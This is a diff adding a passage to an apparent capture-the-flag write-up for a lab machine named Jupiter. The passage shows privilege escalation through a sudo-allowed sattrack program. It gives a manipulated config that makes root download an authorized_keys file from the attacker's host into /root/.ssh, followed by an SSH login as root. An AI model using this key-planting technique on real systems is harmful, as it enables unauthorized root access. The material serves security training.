@@ -900,6 +900,72 @@ Testing a way to exploit this program
 
 We did it! We managed to get `root` to fetch the file from our `server` and drop it into `/tmp` with the same name.
 
+Now that we’re able to make root modify any file, we’re going to inject our machine’s `authorized_keys` file in order to connect via `SSH` as root.
+
+Config file manipulated:
+
+```json
+{
+	"tleroot": "/root/.ssh/",
+	"tlefile": "weather.txt",
+	"mapfile": "/usr/local/share/sattrack/map.json",
+	"texturefile": "/usr/local/share/sattrack/earth.png",
+	
+	"tlesources": [
+		"http://10.10.14.31/authorized_keys"
+],
+	
+	"updatePerdiod": 1000,
+	
+	"station": {
+		"name": "LORCA",
+		"lat": 37.6725,
+		"lon": -1.5863,
+		"hgt": 335.0
+	},
+	
+	"show": [
+	],
+	
+	"columns": [
+		"name",
+		"azel",
+		"dis",
+		"geo",
+		"tab",
+		"pos",
+		"vel"
+	]
+}
+```
+
 <br />
 
+Run the program:
 
+<br />
+
+```bash
+jovian@jupiter:/usr/local/share/sattrack$ sudo /usr/local/bin/sattrack 
+Satellite Tracking System
+Get:0 http://10.10.14.31/authorized_keys
+tlefile is not a valid file
+```
+
+<br />
+
+And try to connect with SSH as `root`:
+
+<br />
+
+```bash
+❯ ssh -i id_rsa root@10.10.11.216
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
+...[snip]...
+root@jupiter:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@jupiter:~# cat root.txt
+7a41eb357f719f7a2c347d0267xxxxxx
+```
+
+<br />
